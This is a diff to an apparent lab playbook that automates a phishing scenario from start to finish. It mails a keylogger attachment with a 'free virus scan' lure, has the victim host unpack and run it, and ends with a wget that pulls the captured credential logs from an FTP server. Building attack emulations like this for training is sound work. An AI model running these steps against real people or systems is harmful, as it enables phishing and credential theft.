@@ -7,13 +7,19 @@
   tasks:
     - name: send a phishing email
       raw: echo "Are you frustrated with how slow your computer is? Open the attachment for a free virus scan!" | mutt -s "Free virus scan!" -a keylogger.py -- contractor@fazio.com
-
 - name: phishing response
   hosts: contractor
   tasks:
     - name: download the email
       raw: fetchmail
+    - name: isolate the email in home directory
+      raw: grep -lir "keylogger" /home/ubuntu/mail/new | xargs -I {} mv {} /home/ubuntu
     - name: unpack the attachment
-      raw: munpack /var/mail/ubuntu
+      raw: grep -lir "keylogger" /home/ubuntu | xargs munpack
     - name: run the keylogger
       raw: python keylogger.py
+- name: recover captured credentials
+  hosts: blackhat
+  tasks:
+    - name: download log file from ftp
+      raw: wget --user=anonymous --password='contractor@fazio.com' ftp://ftp.fazio.com:21/upload/logs.txt
